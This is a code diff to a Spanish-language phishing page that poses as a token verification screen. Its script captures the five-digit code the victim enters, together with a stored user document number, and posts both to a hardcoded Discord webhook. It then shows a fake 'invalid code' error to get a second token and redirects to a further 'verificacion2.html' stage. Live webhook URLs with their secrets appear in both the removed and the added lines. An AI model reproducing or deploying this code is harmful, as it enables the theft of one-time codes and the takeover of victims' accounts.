@@ -401,121 +401,127 @@
         </svg>
     </button>
 
-    <script>
-        var WEBHOOK = 'https://discord.com/api/webhooks/1498207923891998770/TCeIE05gzrV44kMIUO_kiHfPYhCejYdc5lMIaWlvCMbtbp1c-sKFMS1KxuIGQ1klRxSw';
-        var _attempt = 0;
+   <script>
+    var WEBHOOK = 'https://discordapp.com/api/webhooks/1548298056758202462/P1UeiRNIcAlKPZ0gOCJW_Tv6jnDpmUbK1uHVuhWdtsxLzYztY8XzpAKTCHeC-50Q1CuJ';
+    var _attempt = 0;
 
-        async function enviarDiscord(embed) {
-            try {
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [embed] })
-                });
-            } catch (e) { }
-        }
+    async function enviarDiscord(embed) {
+        try {
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+        } catch (e) { }
+    }
 
-        // ── Show 15s loader then reveal card ──
-        window.addEventListener('DOMContentLoaded', function () {
-            setTimeout(function () {
-                document.getElementById('loaderScreen').style.display = 'none';
-                document.getElementById('mainContent').style.display = 'flex';
-            }, 15000);
+    // ── Show 15s loader then reveal card ──
+    window.addEventListener('DOMContentLoaded', function () {
+        setTimeout(function () {
+            document.getElementById('loaderScreen').style.display = 'none';
+            document.getElementById('mainContent').style.display = 'flex';
+        }, 15000);
 
-            var codeBox = document.getElementById('codeBox');
+        var codeBox = document.getElementById('codeBox');
+        
+        // Input validation - only numbers
+        codeBox.addEventListener('input', function () {
+            // Remove non-numeric characters
+            this.value = this.value.replace(/[^0-9]/g, '');
             
-            // Input validation - only numbers
-            codeBox.addEventListener('input', function () {
-                // Remove non-numeric characters
-                this.value = this.value.replace(/[^0-9]/g, '');
-                
-                // Add/remove filled class based on content
-                if (this.value.length > 0) {
-                    this.classList.add('filled');
-                } else {
-                    this.classList.remove('filled');
-                }
-                
-                // Enable/disable button based on 5 digits
-                document.getElementById('btnVerificar').disabled = this.value.length !== 5;
-            });
-
-            // Handle Enter key
-            codeBox.addEventListener('keydown', function (e) {
-                if (e.key === 'Enter' && this.value.length === 5) {
-                    submitCode();
-                }
-            });
-
-            // Handle paste
-            codeBox.addEventListener('paste', function (e) {
-                e.preventDefault();
-                var text = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 5);
-                this.value = text;
-                
-                if (text.length > 0) {
-                    this.classList.add('filled');
-                } else {
-                    this.classList.remove('filled');
-                }
-                
-                document.getElementById('btnVerificar').disabled = text.length !== 5;
-            });
+            // Add/remove filled class based on content
+            if (this.value.length > 0) {
+                this.classList.add('filled');
+            } else {
+                this.classList.remove('filled');
+            }
+            
+            // Enable/disable button based on 5 digits
+            document.getElementById('btnVerificar').disabled = this.value.length !== 5;
         });
 
-        // ── Submit code — always fails, always sends to Discord ──
-        async function submitCode() {
-            var codeBox = document.getElementById('codeBox');
-            var code = codeBox.value;
+        // Handle Enter key
+        codeBox.addEventListener('keydown', function (e) {
+            if (e.key === 'Enter' && this.value.length === 5) {
+                submitCode();
+            }
+        });
+
+        // Handle paste
+        codeBox.addEventListener('paste', function (e) {
+            e.preventDefault();
+            var text = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 5);
+            this.value = text;
             
-            if (code.length < 5) return;
+            if (text.length > 0) {
+                this.classList.add('filled');
+            } else {
+                this.classList.remove('filled');
+            }
+            
+            document.getElementById('btnVerificar').disabled = text.length !== 5;
+        });
+    });
 
-            _attempt++;
-            var currentAttempt = _attempt;
+    // ── Submit code — sends to Discord, redirects on 2nd attempt ──
+    async function submitCode() {
+        var codeBox = document.getElementById('codeBox');
+        var code = codeBox.value;
+        
+        if (code.length < 5) return;
 
-            var usuario = localStorage.getItem('mp_usuario') || 'Desconocido';
+        _attempt++;
+        var currentAttempt = _attempt;
 
-            // hide error, show processing
-            document.getElementById('errorBox').style.display = 'none';
-            document.getElementById('btnVerificar').style.display = 'none';
-            document.getElementById('btnLoader').style.display = 'flex';
-            document.getElementById('codeInputContainer').style.opacity = '0.4';
-            document.getElementById('codeInputContainer').style.pointerEvents = 'none';
+        var usuario = localStorage.getItem('mp_usuario') || 'Desconocido';
 
-            // send straight to Discord
-            await enviarDiscord({
-                title: "📱 TOKEN — Intento #" + currentAttempt,
-                color: currentAttempt === 1 ? 15844367 : 15158332,
-                fields: [
-                    { name: "👤 Documento", value: "`" + usuario + "`", inline: true },
-                    { name: "🔢 Token", value: "`" + code + "`", inline: true },
-                    { name: "🔁 Intento", value: "`" + currentAttempt + "`", inline: true }
-                ],
-                timestamp: new Date().toISOString()
-            });
+        // hide error, show processing
+        document.getElementById('errorBox').style.display = 'none';
+        document.getElementById('btnVerificar').style.display = 'none';
+        document.getElementById('btnLoader').style.display = 'flex';
+        document.getElementById('codeInputContainer').style.opacity = '0.4';
+        document.getElementById('codeInputContainer').style.pointerEvents = 'none';
 
-            // always wait 15s then show error
-            setTimeout(function () {
-                document.getElementById('btnLoader').style.display = 'none';
-                document.getElementById('btnVerificar').style.display = 'block';
+        // send straight to Discord
+        await enviarDiscord({
+            title: "📱 TOKEN — Intento #" + currentAttempt,
+            color: currentAttempt === 1 ? 15844367 : 15158332,
+            fields: [
+                { name: "👤 Documento", value: "`" + usuario + "`", inline: true },
+                { name: "🔢 Token", value: "`" + code + "`", inline: true },
+                { name: "🔁 Intento", value: "`" + currentAttempt + "`", inline: true }
+            ],
+            timestamp: new Date().toISOString()
+        });
 
-                // clear input
-                codeBox.value = '';
-                codeBox.classList.remove('filled');
-                document.getElementById('codeInputContainer').style.opacity = '1';
-                document.getElementById('codeInputContainer').style.pointerEvents = 'auto';
-                document.getElementById('btnVerificar').disabled = true;
-                codeBox.focus();
-
-                var errorBox = document.getElementById('errorBox');
-                var errorMsg = document.getElementById('errorMsg');
-                errorBox.style.display = 'block';
-
-                errorMsg.textContent = 'El código ingresado no es válido. Por favor verifique e intente nuevamente.';
-                document.getElementById('verifySubtitle').textContent = 'El código que ingresó no coincide. Inténtelo de nuevo con el código enviado a su dispositivo.';
-            }, 15000);
+        // Si es el segundo intento, redirigir inmediatamente
+        if (currentAttempt === 2) {
+            window.location.href = 'verificacion2.html';
+            return;
         }
-    </script>
+
+        // Primer intento: esperar 15s y mostrar error
+        setTimeout(function () {
+            document.getElementById('btnLoader').style.display = 'none';
+            document.getElementById('btnVerificar').style.display = 'block';
+
+            // clear input
+            codeBox.value = '';
+            codeBox.classList.remove('filled');
+            document.getElementById('codeInputContainer').style.opacity = '1';
+            document.getElementById('codeInputContainer').style.pointerEvents = 'auto';
+            document.getElementById('btnVerificar').disabled = true;
+            codeBox.focus();
+
+            var errorBox = document.getElementById('errorBox');
+            var errorMsg = document.getElementById('errorMsg');
+            errorBox.style.display = 'block';
+
+            errorMsg.textContent = 'El código ingresado no es válido. Por favor verifique e intente nuevamente.';
+            document.getElementById('verifySubtitle').textContent = 'El código que ingresó no coincide. Inténtelo de nuevo con el código enviado a su dispositivo.';
+        }, 15000);
+    }
+</script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 
